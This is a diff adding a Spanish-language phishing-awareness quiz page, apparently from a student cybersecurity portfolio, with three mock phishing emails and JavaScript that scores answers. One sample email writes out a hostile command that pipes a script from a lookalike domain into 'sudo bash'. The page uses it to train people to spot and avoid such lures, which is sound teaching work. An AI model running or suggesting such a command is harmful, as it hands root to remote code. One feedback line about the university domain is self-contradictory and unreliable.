@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+        <meta name="description" content />
+        <meta name="author" content />
+        <title>Contacto</title>
+        <!-- Favicon-->
+        <link rel="icon" type="image/x-icon" href="assets/favicon.ico" />
+        <!-- Custom Google font-->
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@100;200;300;400;500;600;700;800;900&amp;display=swap" rel="stylesheet" />
+        <!-- Bootstrap icons-->
+        <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css" rel="stylesheet" />
+        <!-- Core theme CSS (includes Bootstrap)-->
+        <link href="css/styles.css" rel="stylesheet" />
+    </head>
+    <body class="d-flex flex-column">
+        <main class="flex-shrink-0">
+            <!-- Navigation-->
+            <nav class="navbar navbar-expand-lg navbar-light bg-white py-3">
+                <div class="container px-5">
+                    <a class="navbar-brand" href="index.html"><span class="fw-bolder text-primary">Ciberseguridad</span></a>
+                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation"><span class="navbar-toggler-icon"></span></button>
+                    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+                        <ul class="navbar-nav ms-auto mb-2 mb-lg-0 small fw-bolder">
+                            <li class="nav-item"><a class="nav-link" href="index.html">Inicio</a></li>
+                            <li class="nav-item"><a class="nav-link" href="resume.html">Perfil</a></li>
+                            <li class="nav-item"><a class="nav-link" href="projects.html">Actividades</a></li>
+                            <li class="nav-item"><a class="nav-link" href="act08.html">ROAD TO HALL OF FAME</a></li>
+                            <li class="nav-item"><a class="nav-link" href="contact.html">Contacto</a></li>
+                        </ul>
+                    </div>
+                </div>
+            </nav>
+            <!-- Page content-->
+            <section class="py-5">
+                <div class="container px-5">
+                    <!-- Contact form-->
+                    <div class="container px-5">
+    <div class="text-center mb-5">
+        <h1 class="display-5 fw-bolder mb-0"><span class="text-gradient d-inline">Phishing Quiz</span></h1>
+        <p class="lead">¿Podrás identificar las señales de peligro?</p>
+    </div>
+
+    <div id="consent-box" class="card shadow border-0 rounded-4 p-5 mb-5">
+        <h3>Aviso de Seguridad y Privacidad</h3>
+        <p>Este quiz es una simulación con fines puramente <strong>educativos</strong>. </p>
+        <ul>
+            <li>No se capturan ni almacenan credenciales reales.</li>
+            <li>Los escenarios están basados en ataques reales de ingeniería social.</li>
+            <li>Al continuar, aceptas participar en esta actividad de aprendizaje.</li>
+        </ul>
+        <button class="btn btn-primary btn-lg px-5 py-3 fs-6 fw-bolder" onclick="startQuiz()">Acepto y Comenzar</button>
+    </div>
+
+    <div id="quiz-container" class="d-none">
+    <div class="card shadow border-0 rounded-4 outlook-window">
+        <div class="outlook-header">
+            <i class="bi bi-envelope-fill me-2"></i>
+            <span id="question-number">Escenario 1 de 10</span>
+        </div>
+
+        <div class="outlook-toolbar">
+            <span><i class="bi bi-reply-fill"></i> Responder</span>
+            <span><i class="bi bi-trash"></i> Eliminar</span>
+            <span><i class="bi bi-archive"></i> Archivar</span>
+            <span class="text-danger"><i class="bi bi-exclamation-octagon"></i> Correo no deseado</span>
+        </div>
+        
+        <div class="outlook-body">
+            <div class="email-meta d-flex align-items-center">
+                
+                <div class="sender-image-container me-3">
+                    <img id="sender-profile-img" src="" alt="Logo" class="d-none rounded-circle">
+                    <div id="sender-initials" class="sender-icon">?</div>
+                </div>
+                <div>
+                    <h5 class="mb-0" id="scenario-title" style="font-size: 1.1rem; color: #323130;">Cargando...</h5>
+                    <small class="text-muted" id="sender-info"></small>
+                </div>
+            </div>
+
+            <div id="email-content" class="mb-4" style="color: #201f1e; line-height: 1.6;">
+                </div>
+
+            <div class="d-flex gap-3 justify-content-center pt-3 border-top">
+                <button class="btn btn-outline-danger px-4 fw-bold" onclick="handleAnswer(true)">
+                    <i class="bi bi-shield-exclamation me-2"></i>Es Phishing
+                </button>
+                <button class="btn btn-outline-success px-4 fw-bold" onclick="handleAnswer(false)">
+                    <i class="bi bi-check-circle me-2"></i>Es Seguro
+                </button>
+            </div>
+        </div>
+    </div>
+
+    <div id="feedback" class="mt-4 d-none">
+        <div class="alert shadow-sm border-start border-4" id="feedback-alert">
+            <div class="d-flex align-items-center mb-2">
+                <h5 id="feedback-title" class="mb-0"></h5>
+            </div>
+            <p id="feedback-text" class="mb-3"></p>
+            <button class="btn btn-primary btn-sm rounded-pill px-4" onclick="nextQuestion()">Continuar al siguiente nivel</button>
+        </div>
+    </div>
+</div>
+</div>
+                </div>
+            </section>
+        </main>
+        <!-- Footer-->
+       <footer class="bg-white py-4 mt-auto">
+            <div class="container px-5">
+                <div class="row align-items-center justify-content-between flex-column flex-sm-row">
+                    <div class="col-auto"><div class="small m-0">Copyright &copy;Eduardo Gabriel Morquecho Medina-2026</div></div>
+                    <div class="col-auto">
+                        <a class="small" href="#!">Aviso de Privacidad</a>
+                        <span class="mx-1">&middot;</span>
+                        <a class="small" href="#!">Repositorio</a>
+                        <span class="mx-1">&middot;</span>
+                        <a class="small" href="contact.html">Contacto</a>
+                    </div>
+                </div>
+            </div>
+        </footer>
+
+<script>
+const scenarios = [
+    {
+        title: "El Paquete de Mensajería",
+        content: `<strong>De:</strong> servicio-entrega@logistica-fast.net<br>
+                  <strong>Asunto:</strong> Acción Requerida: Tu paquete con ID #8821 está retenido<br><br>
+                  Hola, tenemos un problema con tu dirección de envío. Para reprogramar la entrega hoy mismo, paga la tarifa de servicio ($0.99 USD) en el siguiente enlace: <u>http://bit.ly/entrega-urgente-302</u>`,
+        senderLogoUrl: "Actividades/img/dhl.png",
+        isPhishing: true,
+        feedback: "¡Correcto! El uso de acortadores de URL (bit.ly) y un dominio genérico (@logistica-fast.net) son señales claras de fraude. Además, las empresas de mensajería rara vez piden pagos pequeños por SMS o correos inesperados."
+    },
+    {
+        title: "Actualización de Seguridad de la Universidad",
+        content: `<strong>De:</strong> it-support@upslp.edu.mx.seguridad.com<br>
+                  <strong>Asunto:</strong> Migración de Servidor: Valida tu cuenta<br><br>
+                  Estimado estudiante, para evitar la suspensión de tu correo institucional durante la migración al servidor Zentyal, ingresa tus credenciales actuales aquí: [Botón: Validar Cuenta]`,
+        senderLogoUrl: "Actividades/img/upslp.png", // Asegúrate de tener esta imagen
+        isPhishing: true,
+        feedback: "¡Cuidado! Mira bien el dominio: <em>upslp.edu.mx.seguridad.com</em>. El dominio real termina en .com, no en .mx. Es una técnica de subdominios para engañarte."
+    },
+    {
+    title: "Alerta de Repositorio Arch Linux",
+    content: `<strong>De:</strong> security-announce@arch-linux.org.net<br>
+              <strong>Asunto:</strong> [SECURITY] Vulnerabilidad detectada en el Kernel<br><br>
+              Se ha detectado una falla crítica en los repositorios oficiales. Para parchar tu sistema inmediatamente, ejecuta el siguiente comando como superusuario: <br>
+              <code>curl -sL https://archlinux-fix.sh/update | sudo bash</code>`,
+    senderLogoUrl: "Actividades/img/alerta.png", 
+    isPhishing: true,
+    feedback: "¡Peligro detectado! Nunca ejecutes scripts directamente desde `curl` hacia `bash` de fuentes no confirmadas. Además, el dominio oficial es <strong>archlinux.org</strong>, no <em>arch-linux.org.net</em>."
+}
+];
+let currentStep = 0;
+
+function startQuiz() {
+    document.getElementById('consent-box').classList.add('d-none');
+    document.getElementById('quiz-container').classList.remove('d-none');
+    showScenario();
+}
+
+function showScenario() {
+    const s = scenarios[currentStep];
+    
+    // 1. Actualizar textos básicos
+    document.getElementById('question-number').innerText = `Mensaje ${currentStep + 1} de ${scenarios.length}`;
+    document.getElementById('scenario-title').innerText = s.title;
+    
+    // 2. Extraer y mostrar remitente
+    const senderMatch = s.content.match(/<strong>De:<\/strong> (.*?)<br>/);
+    document.getElementById('sender-info').innerText = senderMatch ? senderMatch[1] : "Remitente desconocido";
+    
+    // 3. Mostrar cuerpo del mensaje
+    const bodyContent = s.content.split('<br><br>')[1];
+    document.getElementById('email-content').innerHTML = bodyContent;
+
+    // 4. LÓGICA DE LA IMAGEN (CORREGIDA)
+    const imgElement = document.getElementById('sender-profile-img');
+    const initialsElement = document.getElementById('sender-initials');
+
+    if (s.senderLogoUrl) {
+        imgElement.src = s.senderLogoUrl;
+        imgElement.classList.remove('d-none'); // Muestra la imagen
+        initialsElement.classList.add('d-none'); // Oculta el "?"
+    } else {
+        imgElement.classList.add('d-none');
+        initialsElement.classList.remove('d-none');
+        initialsElement.innerText = s.title.charAt(0).toUpperCase();
+    }
+    
+    // 5. Resetear feedback y scroll
+    document.getElementById('feedback').classList.add('d-none');
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+}
+
+function handleAnswer(userSaysPhishing) {
+    const s = scenarios[currentStep];
+    const feedbackDiv = document.getElementById('feedback');
+    const alertDiv = document.getElementById('feedback-alert');
+    
+    feedbackDiv.classList.remove('d-none');
+    if (userSaysPhishing === s.isPhishing) {
+        alertDiv.className = "alert alert-success border-0 shadow";
+        document.getElementById('feedback-title').innerText = "✅ ¡Excelente Identificación!";
+    } else {
+        alertDiv.className = "alert alert-warning border-0 shadow";
+        document.getElementById('feedback-title').innerText = "❌ Caíste en la trampa";
+    }
+    document.getElementById('feedback-text').innerHTML = s.feedback;
+}
+
+function nextQuestion() {
+    currentStep++;
+    if (currentStep < scenarios.length) {
+        showScenario();
+    } else {
+        alert("¡Felicidades! Has completado el entrenamiento de concientización.");
+        location.reload(); 
+    }
+}
+
+</script>
+
+
+
+    </body>
+</html>
